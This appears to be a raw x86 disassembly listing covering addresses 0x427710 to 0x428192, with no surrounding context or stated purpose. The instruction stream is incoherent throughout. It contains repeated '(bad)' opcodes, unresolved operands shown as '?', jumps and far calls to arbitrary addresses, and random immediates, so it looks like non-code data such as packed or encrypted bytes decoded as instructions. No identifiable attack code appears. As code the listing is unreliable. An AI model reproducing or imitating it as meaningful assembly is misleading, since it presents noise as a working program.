  427710:	xchg   ebx,eax
  427711:	push   ebp
  427712:	pop    esi
  427713:	dec    ecx
  427714:	addr16 inc edx
  427716:	or     ah,BYTE PTR [edx+esi*1+0x5c479450]
  42771d:	mov    ecx,0x19669cee
  427722:	pop    edx
  427723:	xchg   edi,eax
  427724:	sbb    BYTE PTR [edi],ch
  427726:	mov    WORD PTR [ebp-0x1a],cs
  427729:	jae    0x427761
  42772b:	xor    al,0xc2
  42772d:	fdivr  DWORD PTR [eax-0x6e99d29]
  427733:	dec    edx
  427734:	or     dh,BYTE PTR [ecx+0x1d]
  427737:	jno    0x4276e5
  427739:	jnp    0x4276f9
  42773b:	xchg   esp,eax
  42773c:	sub    eax,0xc5fa59f1
  427741:	jle    0x427706
  427743:	iret   
  427744:	stos   DWORD PTR es:[edi],eax
  427745:	xor    BYTE PTR [edx-0x339dc1cf],dh
  42774b:	xor    ah,dh
  42774d:	xchg   edx,eax
  42774e:	aas    
  42774f:	jnp    0x427748
  427751:	sub    eax,0xd6fe84c2
  427756:	sbb    edi,DWORD PTR [edi]
  427758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427759:	push   ds
  42775a:	inc    eax
  42775b:	pop    ebp
  42775c:	add    al,0x41
  42775e:	shl    BYTE PTR [edi-0x2931b688],0x56
  427765:	pop    ds
  427766:	ins    BYTE PTR es:[edi],dx
  427767:	test   DWORD PTR [esi-0x7c769866],eax
  42776d:	fmul   DWORD PTR [edx+edx*4]
  427770:	pop    ds
  427771:	stos   BYTE PTR es:[edi],al
  427772:	push   edi
  427773:	and    ebx,DWORD PTR [eax]
  427775:	lea    ebx,[edx-0x60]
  427778:	adc    ch,BYTE PTR [ecx+0xe6dab2d]
  42777e:	jae    0x42775d
  427780:	push   ecx
  427781:	or     BYTE PTR [eax+0x2c9d6ec0],al
  427787:	mov    bl,0x5f
  427789:	xchg   dl,ah
  42778b:	aaa    
  42778c:	jg     0x427798
  42778e:	jbe    0x4277d3
  427790:	aaa    
  427791:	xchg   esp,eax
  427792:	pop    edx
  427793:	mov    ecx,0xa7d0d9a2
  427798:	fmul   QWORD PTR [ecx]
  42779a:	aaa    
  42779b:	ret    
  42779c:	jge    0x4277b6
  42779e:	retf   0xfccd
  4277a1:	minps  xmm3,XMMWORD PTR [edi+0x43]
  4277a5:	mov    al,ds:0x8b989535
  4277aa:	mov    cl,0x42
  4277ac:	adc    eax,0x4c30710
  4277b1:	inc    ecx
  4277b2:	push   ecx
  4277b3:	sub    BYTE PTR [eax],bl
  4277b5:	test   al,0xfc
  4277b7:	cdq    
  4277b8:	jno    0x427815
  4277ba:	dec    ebp
  4277bb:	gs mov dl,0x44
  4277be:	stos   DWORD PTR es:[edi],eax
  4277bf:	ja     0x42782f
  4277c1:	ret    0xd36a
  4277c4:	inc    edx
  4277c5:	sub    cl,BYTE PTR [eax+esi*4+0x1d]
  4277c9:	xchg   ecx,eax
  4277ca:	mov    DWORD PTR [esi],esi
  4277cc:	das    
  4277cd:	test   al,0x17
  4277cf:	mov    al,ds:0xf62fc550
  4277d4:	sbb    eax,0x6d0cd81c
  4277d9:	jmp    0x427814
  4277db:	enter  0x187c,0x56
  4277df:	add    ebx,DWORD PTR [edx]
  4277e1:	adc    eax,0x206b321c
  4277e6:	and    cl,BYTE PTR [ebx+0x65]
  4277e9:	test   eax,0x466a1d1f
  4277ee:	sub    BYTE PTR [ebx],0xa2
  4277f1:	test   eax,0xfdffd525
  4277f6:	js     0x4277bb
  4277f8:	lods   eax,DWORD PTR ds:[esi]
  4277f9:	adc    edx,DWORD PTR [ecx-0x5e07083]
  4277ff:	stos   DWORD PTR es:[edi],eax
  427800:	ds (bad) 
  427802:	out    0x24,eax
  427804:	stc    
  427805:	sub    esi,DWORD PTR [ebx+0x4662ede0]
  42780b:	aas    
  42780c:	sbb    DWORD PTR [ecx],edi
  42780e:	stos   BYTE PTR es:[edi],al
  42780f:	mov    ds:0x9,eax
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	(bad)  
  427881:	dec    bl
  427883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xcb000001
  42788d:	mov    esp,0xe703ca01
  427892:	add    ebp,ebx
  427894:	jae    0x4278c7
  427896:	adc    BYTE PTR [edi+0x1b7be23],bl
  42789c:	out    0x9c,eax
  42789e:	or     eax,0xfed3eafd
  4278a3:	adc    al,0x1e
  4278a5:	xchg   esp,eax
  4278a6:	sar    DWORD PTR [edx],1
  4278a8:	retf   0x80
  4278ab:	add    esp,ebx
  4278ad:	mov    ds,WORD PTR [ebp-0x61]
  4278b0:	loopne 0x42786e
  4278b2:	aas    
  4278b3:	adc    eax,0x9f253257
  4278b8:	std    
  4278b9:	adc    DWORD PTR [ebp+0x43],0xcd1ab60
  4278c0:	test   DWORD PTR [eax-0x2a570ade],0x9c09d9a8
  4278ca:	ret    0xbef
  4278cd:	pop    edx
  4278ce:	out    0x66,al
  4278d0:	les    ebp,FWORD PTR [edi]
  4278d2:	cmp    BYTE PTR [ebx+0x32b8a69a],ch
  4278d8:	retf   0x3671
  4278db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278dc:	ret    
  4278dd:	and    dh,BYTE PTR ds:0xb1e6acb3
  4278e3:	add    edx,DWORD PTR [esi]
  4278e5:	cmp    eax,0x9f617ba0
  4278ea:	push   edx
  4278eb:	push   eax
  4278ec:	dec    ebx
  4278ed:	adc    al,0xb2
  4278ef:	loope  0x427885
  4278f1:	in     eax,0x9b
  4278f3:	es test al,0x82
  4278f6:	jae    0x427907
  4278f8:	mov    DWORD PTR [edx],ebp
  4278fa:	imul   ebx,DWORD PTR [ebx+0x793dff5e],0xdbb96b6b
  427904:	xchg   DWORD PTR [ebp+0x4f23330a],edi
  42790a:	pushf  
  42790b:	rcl    DWORD PTR [edx+0x5c240c82],cl
  427911:	sar    BYTE PTR [esi+0x17],1
  427914:	mov    eax,0x55ba085a
  427919:	push   0x74a05892
  42791e:	int    0x5a
  427920:	cwde   
  427921:	inc    ebx
  427922:	push   es
  427923:	jmp    0x5f33917d
  427928:	popf   
  427929:	xchg   ebx,eax
  42792a:	push   edi
  42792b:	push   0x2b
  42792d:	popf   
  42792e:	into   
  42792f:	arpl   WORD PTR [ebx-0x3eefd742],di
  427935:	push   esp
  427936:	and    ebx,DWORD PTR [eax+0x209c745a]
  42793c:	cs jbe 0x42795c
  42793f:	call   0x40a1:0x72a9cd41
  427946:	in     al,0xa
  427948:	and    al,0x9e
  42794a:	les    esp,FWORD PTR [ecx-0x3d8d7744]
  427950:	pop    ebp
  427951:	cmp    eax,0x92e4c50f
  427956:	test   BYTE PTR [ebx],dl
  427958:	fld    TBYTE PTR [esi+0x442a6536]
  42795e:	xchg   edi,eax
  42795f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427960:	jp     0x4278f0
  427962:	js     0x42793c
  427964:	xor    eax,0x8f09953c
  427969:	lds    edi,FWORD PTR [ecx]
  42796b:	es cmp eax,0x9e6b0136
  427971:	ins    DWORD PTR es:[edi],dx
  427972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427973:	add    esi,edi
  427975:	jb     0x42796e
  427977:	cmc    
  427978:	sub    DWORD PTR [edx+0x5a],eax
  42797b:	or     ebp,DWORD PTR [ecx+0x4bc5a005]
  427981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427982:	sub    eax,0x1dfed821
  427987:	popa   
  427988:	and    eax,0xff9ec11
  42798d:	jbe    0x427979
  42798f:	lds    esp,FWORD PTR [ebx+0x0]
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x2cc4f6db]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	xor    bh,BYTE PTR [edx+0xe]
  427a0f:	adc    dl,BYTE PTR [edi-0x1a]
  427a12:	push   esp
  427a13:	fcmovnb st,st(1)
  427a15:	pop    ebp
  427a16:	mov    eax,0x15d90f36
  427a1b:	adc    eax,0x74aa41d1
  427a20:	jb     0x427a1c
  427a22:	stos   DWORD PTR es:[edi],eax
  427a23:	pop    esi
  427a24:	dec    ecx
  427a25:	fdiv   QWORD PTR [edx+eiz*1]
  427a28:	mov    ecx,0x6b5a2006
  427a2d:	push   es
  427a2e:	sub    DWORD PTR [ecx+edx*4-0x4d],ecx
  427a32:	popa   
  427a33:	mov    dh,0x55
  427a35:	jge    0x427a2f
  427a37:	lods   eax,DWORD PTR ds:[esi]
  427a38:	aaa    
  427a39:	jl     0x4279cd
  427a3b:	mov    dl,0xc4
  427a3d:	mov    esp,0xe1b9c381
  427a42:	mov    ecx,0x7e572688
  427a47:	adc    eax,0xaf0b6549
  427a4c:	mov    edx,0xca3de133
  427a51:	jecxz  0x427a56
  427a53:	adc    eax,DWORD PTR [ebx]
  427a55:	gs (bad) 
  427a57:	rcl    DWORD PTR [ebx],cl
  427a59:	fnstenv [eax+0x3f4c4db0]
  427a5f:	sbb    al,0xbb
  427a61:	in     al,0x74
  427a63:	sub    ch,BYTE PTR [edi+eax*1-0x33d58060]
  427a6a:	dec    ecx
  427a6b:	pop    es
  427a6c:	sub    eax,0xba7c5213
  427a71:	pop    ss
  427a72:	push   ebx
  427a73:	mov    BYTE PTR [eax],ch
  427a75:	mov    al,ds:0x8e4d3bef
  427a7a:	adc    eax,0xff5410ce
  427a7f:	popa   
  427a80:	sbb    BYTE PTR [ecx],0xbd
  427a83:	scas   al,BYTE PTR es:[edi]
  427a84:	js     0x786fe021
  427a8a:	or     al,0x7a
  427a8c:	imul   edx,DWORD PTR [ebx+0x3f2f60af],0x801070e1
  427a96:	jle    0x427ac7
  427a98:	test   DWORD PTR [ebx+0x648ffd3e],ecx
  427a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a9f:	retf   
  427aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427aa1:	dec    edi
  427aa2:	push   ebx
  427aa3:	cmp    eax,0x30c7ffa
  427aa8:	or     DWORD PTR [esi+0x7562fdc5],ecx
  427aae:	xor    dh,BYTE PTR [ebx+0x20]
  427ab1:	sbb    al,0x6c
  427ab3:	dec    ecx
  427ab4:	dec    esi
  427ab5:	xchg   ecx,eax
  427ab6:	inc    edx
  427ab7:	xor    ah,ch
  427ab9:	jle    0x427a8e
  427abb:	cli    
  427abc:	std    
  427abd:	mov    bl,0x95
  427abf:	lea    esp,[ebp+0x93efa6b]
  427ac5:	add    BYTE PTR [ecx-0x5344b7d9],bl
  427acb:	mov    dh,0x2c
  427acd:	imul   esp,esi,0x30840ab4
  427ad3:	jl     0x427b47
  427ad5:	loopne 0x427b0b
  427ad7:	inc    ebx
  427ad8:	out    dx,al
  427ad9:	sbb    bl,BYTE PTR [ecx-0xa]
  427adc:	xchg   esi,eax
  427add:	inc    esp
  427ade:	pop    ds
  427adf:	loope  0x427b51
  427ae1:	inc    esi
  427ae2:	sub    BYTE PTR [esp+esi*4],0x80
  427ae6:	es mov dh,0x84
  427ae9:	outs   dx,BYTE PTR ds:[esi]
  427aea:	fild   WORD PTR [eax-0xe]
  427aed:	in     al,dx
  427aee:	pop    esp
  427aef:	or     eax,0x6b87e636
  427af4:	mov    edi,es
  427af6:	dec    esi
  427af7:	and    BYTE PTR [ecx+0xa146fb8],dl
  427afd:	or     DWORD PTR [ecx-0x12],0x9a3b7130
  427b04:	mov    cl,0x6
  427b06:	cmp    eax,DWORD PTR [ebp-0x19]
  427b09:	mov    cl,0x13
  427b0b:	mov    ebp,0xa074b61b
  427b10:	cmc    
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [ecx-0x461f485],0xa8
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0xc7000001
  427b8d:	(bad)  
  427b8e:	jle    0x427b3b
  427b90:	or     eax,esp
  427b92:	data16 jne 0x427b32
  427b95:	mov    ch,0x6
  427b97:	mov    esp,0xc57f9a06
  427b9c:	ret    
  427b9d:	mov    ecx,0x7f8db180
  427ba2:	mov    ebx,0x30d09bf5
  427ba7:	and    bh,ch
  427ba9:	mov    fs,WORD PTR [ecx+edi*1-0x35e540b9]
  427bb0:	sub    eax,0xf3f5eea7
  427bb5:	sub    BYTE PTR [ecx+0x15],dh
  427bb8:	(bad)  
  427bb9:	in     al,dx
  427bba:	ja     0x427bbd
  427bbc:	or     ebx,edi
  427bbe:	outs   dx,DWORD PTR ds:[esi]
  427bbf:	rcr    BYTE PTR [edx+eiz*8+0x3],0xc
  427bc4:	sahf   
  427bc5:	xor    ch,BYTE PTR [eax]
  427bc7:	xchg   ebp,eax
  427bc8:	adc    al,0x62
  427bca:	xor    DWORD PTR [ebp-0x7a],edx
  427bcd:	aaa    
  427bce:	scas   al,BYTE PTR es:[edi]
  427bcf:	jecxz  0x427ba7
  427bd1:	and    al,0x8c
  427bd3:	outs   dx,BYTE PTR ds:[esi]
  427bd4:	cmp    DWORD PTR [edx],edx
  427bd6:	cs ins BYTE PTR es:[edi],dx
  427bd8:	addr16 pop esp
  427bda:	call   0x56e:0x43a6a148
  427be1:	pop    edi
  427be2:	loopne 0x427c3d
  427be4:	ins    BYTE PTR es:[edi],dx
  427be5:	pop    esp
  427be6:	sub    al,bh
  427be8:	out    0x5e,al
  427bea:	scas   al,BYTE PTR es:[edi]
  427beb:	daa    
  427bec:	shr    BYTE PTR [ebx+0x5bcf4290],cl
  427bf2:	jl     0x427b9b
  427bf4:	adc    BYTE PTR [ecx+0x2f],0xb1
  427bf8:	sbb    al,ah
  427bfa:	mov    dh,0x71
  427bfc:	xor    ch,0x7c
  427bff:	sbb    BYTE PTR ds:0xa94bca4,ah
  427c05:	je     0x427c6e
  427c07:	or     dl,dh
  427c09:	inc    esi
  427c0a:	lods   al,BYTE PTR ds:[esi]
  427c0b:	dec    ebx
  427c0c:	pop    ss
  427c0d:	mov    es,WORD PTR [eax-0x1d]
  427c10:	ins    BYTE PTR es:[edi],dx
  427c11:	dec    edx
  427c12:	stos   DWORD PTR es:[edi],eax
  427c13:	and    BYTE PTR [edx+0xd],bh
  427c16:	dec    ebp
  427c17:	mov    ebp,0x9f34471b
  427c1c:	call   DWORD PTR [edi+0x4b]
  427c1f:	in     al,dx
  427c20:	in     al,dx
  427c21:	add    al,0xb8
  427c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c24:	lods   eax,DWORD PTR ds:[esi]
  427c25:	push   ds
  427c26:	inc    ebx
  427c27:	mov    cl,0x2f
  427c29:	nop
  427c2a:	mov    BYTE PTR [ecx+eiz*4],al
  427c2d:	stos   DWORD PTR es:[edi],eax
  427c2e:	xchg   esp,eax
  427c2f:	stc    
  427c30:	pop    esi
  427c31:	fwait
  427c32:	loope  0x427c50
  427c34:	sti    
  427c35:	sahf   
  427c36:	jne    0x427c56
  427c38:	adc    DWORD PTR [edi+0x71],esp
  427c3b:	jo     0x427caa
  427c3d:	and    eax,0xf40c219a
  427c42:	cmp    ebx,DWORD PTR [eax+0x11e2155c]
  427c48:	pop    ebx
  427c49:	xchg   esi,eax
  427c4a:	cld    
  427c4b:	loop   0x427c5d
  427c4d:	ficom  WORD PTR [ebp+0x1f]
  427c50:	(bad)  
  427c51:	cmp    al,0xc2
  427c53:	leave  
  427c54:	adc    DWORD PTR [ecx+0x78ade920],edi
  427c5a:	mov    WORD PTR ds:0x590a94c1,?
  427c60:	inc    ebx
  427c61:	xor    cl,bh
  427c63:	inc    esi
  427c64:	mov    al,ds:0x59ae4de9
  427c69:	lds    esp,FWORD PTR [edi+0x47]
  427c6c:	inc    ebx
  427c6d:	sub    eax,0x3c804675
  427c72:	push   esi
  427c73:	xchg   esi,eax
  427c74:	sbb    al,0x77
  427c76:	push   cs
  427c77:	bound  esp,QWORD PTR [edi-0x40ae815f]
  427c7d:	ins    BYTE PTR es:[edi],dx
  427c7e:	jmp    0xbfedbcb5
  427c83:	lods   eax,DWORD PTR cs:[esi]
  427c85:	add    esi,ebp
  427c87:	lds    eax,FWORD PTR ds:0x62548bcd
  427c8d:	add    esi,ecx
  427c8f:	sbb    BYTE PTR [esi],0x0
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x36ca5d44,ebx
  427d02:	sub    BYTE PTR [edx+0x1aa00],dl
  427d08:	add    eax,0xa7000001
  427d0d:	cld    
  427d0e:	jb     0x427d0c
  427d10:	xlat   BYTE PTR ds:[ebx]
  427d11:	outs   dx,BYTE PTR ds:[esi]
  427d12:	and    eax,0x4dbf0ec7
  427d17:	clc    
  427d18:	pop    eax
  427d19:	imul   esi,DWORD PTR [ebx],0xffffff9b
  427d1c:	pop    ds
  427d1d:	xchg   ecx,eax
  427d1e:	retf   0xaf51
  427d21:	and    BYTE PTR [ebp-0x4f7757e3],dl
  427d27:	test   DWORD PTR [edi],0x94b9b5c0
  427d2d:	pop    ds
  427d2e:	mov    edi,0xd7d6842a
  427d33:	pop    eax
  427d34:	mov    edi,0xc64a7c69
  427d39:	sbb    bl,BYTE PTR [edx+0x58]
  427d3c:	mov    BYTE PTR cs:[edx-0x23],bh
  427d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d41:	or     DWORD PTR [edx+0x2d],eax
  427d44:	arpl   WORD PTR [esi-0x3c34a27f],di
  427d4a:	shr    DWORD PTR [edx+0x2faef8d1],cl
  427d50:	arpl   ax,sp
  427d52:	aaa    
  427d53:	sbb    al,BYTE PTR [eax]
  427d55:	pop    esi
  427d56:	aam    0x9a
  427d58:	inc    esp
  427d59:	xlat   BYTE PTR ds:[ebx]
  427d5a:	mov    ?,esp
  427d5c:	adc    eax,0x5b5e244c
  427d61:	icebp  
  427d62:	cmc    
  427d63:	fdiv   DWORD PTR [edi]
  427d65:	imul   esi,DWORD PTR [edx-0x7451ae92],0xc
  427d6c:	sbb    BYTE PTR [ebx+eax*2+0x67],dh
  427d70:	adc    DWORD PTR [esi+0x57],eax
  427d73:	inc    esp
  427d74:	inc    edi
  427d75:	pop    ebp
  427d76:	pop    edi
  427d77:	out    dx,eax
  427d78:	clc    
  427d79:	sub    eax,0x9ebd6477
  427d7e:	cdq    
  427d7f:	push   ebp
  427d80:	mov    ds:0xbdb7998f,eax
  427d85:	push   ds
  427d86:	aam    0x6
  427d88:	sub    DWORD PTR [eax+0x2de603ad],esi
  427d8e:	jnp    0x427dfa
  427d90:	lock pop ebx
  427d92:	mov    dh,BYTE PTR [ebx]
  427d94:	xchg   bh,cl
  427d96:	dec    esi
  427d97:	clc    
  427d98:	mov    edx,0x3343d10d
  427d9d:	dec    esi
  427d9e:	and    BYTE PTR [edi],dl
  427da0:	fld    QWORD PTR [edi]
  427da2:	xchg   ecx,eax
  427da3:	repz add esp,DWORD PTR [esi-0x11]
  427da7:	test   bh,cl
  427da9:	leave  
  427daa:	pop    ebp
  427dab:	xchg   esp,eax
  427dac:	sti    
  427dad:	mov    eax,ds:0x34b5a0cc
  427db2:	xchg   esp,eax
  427db3:	lods   al,BYTE PTR ds:[esi]
  427db4:	push   ecx
  427db5:	in     eax,0xbb
  427db7:	sbb    bl,bh
  427db9:	lahf   
  427dba:	cmp    BYTE PTR [edx],0x63
  427dbd:	ficom  DWORD PTR [ecx-0x7606d67]
  427dc3:	sbb    ah,BYTE PTR [eax-0x3b6fc82f]
  427dc9:	ins    DWORD PTR es:[edi],dx
  427dca:	adc    al,0x66
  427dcc:	or     BYTE PTR [eax-0x2763e2ed],dl
  427dd2:	xor    bl,BYTE PTR [ebp+0x2b]
  427dd5:	jno    0x427ded
  427dd7:	add    edi,DWORD PTR [esi-0xe]
  427dda:	rep stos DWORD PTR es:[edi],eax
  427ddc:	pop    ebp
  427ddd:	push   ecx
  427dde:	xchg   edi,eax
  427ddf:	pop    ds
  427de0:	rol    DWORD PTR [esi+eiz*1],0x67
  427de4:	mov    ebx,0x6f10ce4a
  427de9:	aas    
  427dea:	sbb    al,0xda
  427dec:	mov    ah,0xeb
  427dee:	add    BYTE PTR [eax],cl
  427df0:	add    al,0x8b
  427df2:	fst    DWORD PTR [esi-0x55]
  427df5:	sti    
  427df6:	pusha  
  427df7:	adc    al,0xe2
  427df9:	daa    
  427dfa:	mov    cl,0x95
  427dfc:	dec    ebp
  427dfd:	aas    
  427dfe:	or     ebp,ecx
  427e00:	test   BYTE PTR [esi+ebp*1+0x72],al
  427e04:	mov    ch,0xa0
  427e06:	adc    dl,0x38
  427e09:	mov    eax,ds:0x4cdd8b49
  427e0e:	ds push ss
  427e10:	sbb    eax,DWORD PTR [eax]
	...
  427e72:	add    BYTE PTR [eax],al
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	pop    ebx
  427e81:	addr16 cwde 
  427e83:	das    
  427e84:	add    eax,0x50001ab
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    BYTE PTR [ebp+0x18],bl
  427e8e:	jmp    0x427ee2
  427e90:	aad    0x6c
  427e92:	lods   eax,DWORD PTR ds:[esi]
  427e93:	xchg   edx,eax
  427e94:	ins    DWORD PTR es:[edi],dx
  427e95:	(bad)  
  427e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e98:	add    eax,0x81702b53
  427e9d:	stc    
  427e9e:	retf   0xf0f0
  427ea1:	mov    ds:0x62f8baf0,al
  427ea6:	ins    BYTE PTR es:[edi],dx
  427ea7:	repz gs call 0x4d74:0xe803c2dd
  427eb0:	or     eax,0x57151c04
  427eb5:	xor    BYTE PTR [ebx],cl
  427eb7:	hlt    
  427eb8:	loope  0x427f0b
  427eba:	call   0x6787618
  427ebf:	imul   ebp,DWORD PTR [ecx+0x7c],0x7d494e6
  427ec6:	sbb    eax,0x448fb434
  427ecb:	call   0xd8e38eb
  427ed0:	(bad)  
  427ed1:	push   DWORD PTR [ebx]
  427ed3:	inc    ebx
  427ed4:	add    eax,0xaadd37a8
  427ed9:	mov    dh,0xda
  427edb:	fndisi(8087 only) 
  427edd:	push   esi
  427ede:	cmp    eax,0xa8c009ef
  427ee3:	daa    
  427ee4:	jecxz  0x427f1e
  427ee6:	ins    BYTE PTR es:[edi],dx
  427ee7:	mov    eax,0x3872d880
  427eec:	xor    dh,bh
  427eee:	mov    dh,dh
  427ef0:	pop    ecx
  427ef1:	xor    eax,0x21d5c1f5
  427ef6:	mov    BYTE PTR [eax],bh
  427ef8:	dec    eax
  427ef9:	mov    cl,dh
  427efb:	or     BYTE PTR [edi],0xba
  427efe:	in     al,0x29
  427f00:	mov    esp,DWORD PTR [esi-0x2f]
  427f03:	mov    ah,BYTE PTR [ecx+ecx*2+0x4ef44623]
  427f0a:	bound  eax,QWORD PTR [edi-0x6179d6d4]
  427f10:	jmp    0x427e9f
  427f12:	retf   0x3d3a
  427f15:	sti    
  427f16:	repnz jecxz 0x427f24
  427f19:	fwait
  427f1a:	mov    esi,0x79aaa09f
  427f1f:	mov    dh,0x9e
  427f21:	add    bl,BYTE PTR [eax]
  427f23:	mov    BYTE PTR [edi-0x40],0x71
  427f27:	inc    edx
  427f28:	in     al,0x66
  427f2a:	call   0xafdb:0x1abf081a
  427f31:	stos   BYTE PTR es:[edi],al
  427f32:	add    cl,ah
  427f34:	dec    esi
  427f35:	push   ebp
  427f36:	leave  
  427f37:	cmc    
  427f38:	cdq    
  427f39:	and    ch,BYTE PTR [ebx+0x6ad3700f]
  427f3f:	inc    edi
  427f40:	mov    bl,0x69
  427f42:	pop    ecx
  427f43:	mov    ah,0xbd
  427f45:	loopne 0x427ee2
  427f47:	imul   esp,DWORD PTR [esi+esi*4+0x442885c7],0xffffffa7
  427f4f:	je     0x427f74
  427f51:	dec    ebp
  427f52:	push   ss
  427f53:	jl     0x427f19
  427f55:	jnp    0x427f10
  427f57:	sbb    BYTE PTR [edi],ch
  427f59:	push   cs
  427f5a:	shl    BYTE PTR [edx],0xa
  427f5d:	outs   dx,DWORD PTR ds:[esi]
  427f5e:	cmp    al,0xc8
  427f60:	xchg   DWORD PTR ds:0x39c35913,esp
  427f66:	arpl   WORD PTR [esi-0x20],bp
  427f69:	and    esi,ebx
  427f6b:	push   0xffffffa7
  427f6d:	gs (bad) 
  427f6f:	das    
  427f70:	out    dx,eax
  427f71:	adc    eax,0xcc3d34ce
  427f76:	fcmovnb st,st(2)
  427f78:	mov    eax,ds:0xbf1efd1e
  427f7d:	push   edx
  427f7e:	sub    cl,cl
  427f80:	xor    DWORD PTR [ebx-0x21],esi
  427f83:	mov    WORD PTR [eax+0x274d56e7],?
  427f89:	xchg   ebp,eax
  427f8a:	lahf   
  427f8b:	pop    ebx
  427f8c:	adc    eax,0xe15e21b3
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	sbb    eax,0xaa5cadf
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x78000001
  42800d:	mov    bh,0xd4
  42800f:	popf   
  428010:	pop    ds
  428011:	out    0xaa,eax
  428013:	mov    ds:0x91669515,eax
  428018:	mov    eax,0x1f13da0c
  42801d:	ret    0x3d18
  428020:	imul   ecx,DWORD PTR [ebp+0x13002e20],0xb5c658f4
  42802a:	arpl   WORD PTR [ebx+0x764cb654],di
  428030:	imul   ebp,DWORD PTR [esi+ecx*2+0x4972828c],0x2360afba
  42803b:	xchg   ebx,eax
  42803c:	inc    ebp
  42803d:	mov    ?,WORD PTR [edi]
  42803f:	jmp    0x428010
  428041:	xchg   ebp,eax
  428042:	(bad)  
  428043:	test   esp,0xe2ae646c
  428049:	mov    edi,eax
  42804b:	imul   esp,eax,0xffffff8e
  42804e:	ss (bad) 
  428050:	sbb    DWORD PTR [eax-0x2f391159],esp
  428056:	jl     0x427fed
  428058:	jecxz  0x428027
  42805a:	jne    0x428076
  42805c:	mov    bl,0xb3
  42805e:	retf   0xb11c
  428061:	repnz not edi
  428064:	add    dl,BYTE PTR [ebp-0x3602ff40]
  42806a:	mov    al,bh
  42806c:	and    bp,WORD PTR [ecx]
  42806f:	outs   dx,DWORD PTR ds:[esi]
  428070:	dec    eax
  428071:	rcl    DWORD PTR [ebp-0x3c488b55],0x9c
  428078:	imul   esp
  42807a:	mov    edi,0x67e63382
  42807f:	xchg   DWORD PTR [ebx+0x47],eax
  428082:	jge    0x42804d
  428084:	test   DWORD PTR [ebx+0x31e14e5e],eax
  42808a:	(bad)  ds:0x6f80c1a3
  428090:	lahf   
  428091:	pop    ebx
  428092:	je     0x4280e4
  428094:	sub    al,0x37
  428096:	pop    edi
  428097:	and    DWORD PTR [esi-0x39],0xffffffbb
  42809b:	stc    
  42809c:	jnp    0x42807f
  42809e:	pop    edi
  42809f:	stc    
  4280a0:	cmp    dh,BYTE PTR [esp+esi*8+0x1feceed5]
  4280a7:	xchg   BYTE PTR [ebp+0x59a4c2a6],dh
  4280ad:	jmp    0xcd5d474b
  4280b2:	mov    ebx,0x83cb7504
  4280b7:	pusha  
  4280b8:	cmp    eax,0xacd6e114
  4280bd:	je     0x428096
  4280bf:	jo     0x428140
  4280c1:	push   cs
  4280c2:	call   0xc2ee:0x81b79ae
  4280c9:	push   cs
  4280ca:	sub    esi,ebx
  4280cc:	(bad)  
  4280cd:	hlt    
  4280ce:	mov    ch,BYTE PTR [ebp-0x3c]
  4280d1:	and    ah,dh
  4280d3:	adc    eax,0xe07a4fe5
  4280d8:	mov    edx,0xfab9f1f5
  4280dd:	aas    
  4280de:	out    0x4b,eax
  4280e0:	inc    esp
  4280e1:	add    ecx,DWORD PTR [ebx+0x556bbdf3]
  4280e7:	push   esi
  4280e8:	adc    cl,BYTE PTR [ecx+0x51]
  4280eb:	mov    al,ds:0x74cdaeac
  4280f0:	mov    ebx,0x399b0d87
  4280f5:	lock jmp 0x428110
  4280f8:	inc    edx
  4280f9:	xor    al,0x7c
  4280fb:	mov    ebp,0x742f4edd
  428100:	cdq    
  428101:	or     eax,0xdda2b34a
  428106:	or     al,0xea
  428108:	not    DWORD PTR [edi+edi*2]
  42810b:	xchg   DWORD PTR [edx],ebp
  42810d:	leave  
  42810e:	mov    dl,0x1a
  428110:	mov    DWORD PTR [eax],eax
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	shl    DWORD PTR [edx-0x52f0a244],1
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0xf5000001
  42818d:	xchg   esp,eax
  42818e:	push   ds
  42818f:	mov    BYTE PTR [bp+si],ch
  428192:	mov    edi,DWORD PTR [ebp+edi*4-0x2f505d29]
